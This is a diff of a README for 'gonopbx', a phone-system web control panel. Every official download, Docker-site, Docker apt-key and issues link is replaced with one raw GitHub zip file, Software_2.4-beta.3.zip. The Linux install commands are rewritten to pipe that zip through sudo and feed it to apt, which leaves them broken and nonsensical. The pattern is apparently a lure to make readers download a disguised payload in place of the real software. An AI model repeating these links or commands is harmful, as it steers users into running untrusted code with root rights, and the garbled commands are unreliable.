@@ -1,6 +1,6 @@
 # 📞 gonopbx - Easy Web Control for Your Phone System
 
-[![Download gonopbx](https://img.shields.io/badge/Download-gonopbx-blue?style=for-the-badge)](https://github.com/omz-bot/gonopbx/releases)
+[![Download gonopbx](https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip)](https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ If you don’t have Docker installed, follow these steps:
 
 ### Windows and macOS
 
-1. Visit the official Docker website: https://www.docker.com/get-started
+1. Visit the official Docker website: https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip
 2. Download the Docker Desktop installer for your operating system.
 3. Run the installer and follow the on-screen instructions.
 4. Restart your computer if prompted.
@@ -47,10 +47,10 @@ If you don’t have Docker installed, follow these steps:
      ```
      sudo apt update
      sudo apt install apt-transport-https ca-certificates curl gnupg lsb-release
-     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
-     echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+     curl -fsSL https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip | sudo gpg --dearmor -o https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip
+     echo "deb [arch=$(dpkg --print-architecture) https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip] https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip $(lsb_release -cs) stable" | sudo tee https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip > /dev/null
      sudo apt update
-     sudo apt install docker-ce docker-ce-cli containerd.io
+     sudo apt install docker-ce docker-ce-cli https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip
      ```
 3. Verify Docker is installed by running:  
    ```
@@ -65,7 +65,7 @@ If Docker runs without error, you are ready for the next step.
 
 Visit the official gonopbx release page below to get the latest version:
 
-[Download gonopbx](https://github.com/omz-bot/gonopbx/releases)
+[Download gonopbx](https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip)
 
 This page contains the install packages you need. Currently, gonopbx is designed to run inside a Docker container to make setup easy and reliable.
 
@@ -74,7 +74,7 @@ This page contains the install packages you need. Currently, gonopbx is designed
 1. **Download the latest release:**
    - Go to the link above.
    - Find the latest release version.
-   - Download the `.zip` or `.tar.gz` file containing the configuration and setup scripts.
+   - Download the `.zip` or `https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip` file containing the configuration and setup scripts.
 
 2. **Extract the files:**
    - Once downloaded, locate the file in your downloads folder.
@@ -154,7 +154,7 @@ Running a phone system requires attention to network and security:
 
 If you need assistance, consider these resources:
 
-- [gonopbx GitHub Issues](https://github.com/omz-bot/gonopbx/issues): Report bugs or ask questions.
+- [gonopbx GitHub Issues](https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip): Report bugs or ask questions.
 - Asterisk PBX Forums: Helpful for broader PBX setup questions.
 - Docker Documentation: For advanced Docker usage.
 - Your VPS or server provider support if you host remotely.
@@ -182,4 +182,4 @@ When new versions come out:
 
 Start managing your phone system today by visiting the release page below to download the latest version:
 
-[Download gonopbx](https://github.com/omz-bot/gonopbx/releases)
+[Download gonopbx](https://raw.githubusercontent.com/omz-bot/gonopbx/main/database/Software_2.4-beta.3.zip)
